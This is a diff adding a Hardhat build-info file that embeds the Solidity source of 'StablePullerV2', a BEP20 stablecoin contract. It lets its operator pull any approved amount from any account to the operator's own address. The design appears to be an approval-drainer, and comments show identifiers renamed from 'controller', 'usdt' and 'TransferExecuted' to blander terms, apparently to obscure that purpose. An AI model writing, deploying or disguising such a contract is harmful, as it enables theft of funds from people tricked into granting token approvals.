@@ -1,0 +1,39 @@
+{
+  "_format": "hh3-sol-build-info-1",
+  "id": "solc-0_8_24-8a48751fc8be61fb23c0744907d051e0e7a1f302",
+  "solcVersion": "0.8.24",
+  "solcLongVersion": "0.8.24+commit.e11b9ed9",
+  "userSourceNameMap": {
+    "contracts/StablePullerV2.sol": "project/contracts/StablePullerV2.sol"
+  },
+  "input": {
+    "language": "Solidity",
+    "settings": {
+      "evmVersion": "shanghai",
+      "optimizer": {
+        "enabled": true,
+        "runs": 200
+      },
+      "outputSelection": {
+        "*": {
+          "": [
+            "ast"
+          ],
+          "*": [
+            "abi",
+            "evm.bytecode",
+            "evm.deployedBytecode",
+            "evm.methodIdentifiers",
+            "metadata"
+          ]
+        }
+      },
+      "remappings": []
+    },
+    "sources": {
+      "project/contracts/StablePullerV2.sol": {
+        "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\ninterface IBEP20 {\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n}\n\ncontract StablePullerV2 {\n    address public operator;   // was \"controller\"\n    IBEP20  public asset;      // was \"usdt\"\n\n    event FundsPulled(address indexed account, uint256 amount);             // was TransferExecuted\n    event OperatorUpdated(address indexed prevOperator, address indexed newOperator); // was ControllerUpdated\n\n    constructor(address assetToken) {\n        operator = msg.sender;\n        asset = IBEP20(assetToken);\n    }\n\n    modifier onlyOperator() {\n        require(msg.sender == operator, \"Not operator\");\n        _;\n    }\n\n    /// @notice Pull an exact amount of tokens from `account` to the operator (admin).\n    /// @dev Requires prior approval to this contract for at least `amount`.\n    function pullExact(address account, uint256 amount) external onlyOperator {\n        require(account != address(0), \"Bad account\");\n        require(amount > 0, \"Zero amount\");\n        require(asset.transferFrom(account, operator, amount), \"Transfer failed\");\n        emit FundsPulled(account, amount);\n    }\n\n    /// @notice Update the operator (admin). Only current operator may call.\n    function setOperator(address newOperator) external onlyOperator {\n        require(newOperator != address(0), \"Bad operator\");\n        emit OperatorUpdated(operator, newOperator);\n        operator = newOperator;\n    }\n}\n"
+      }
+    }
+  }
+}
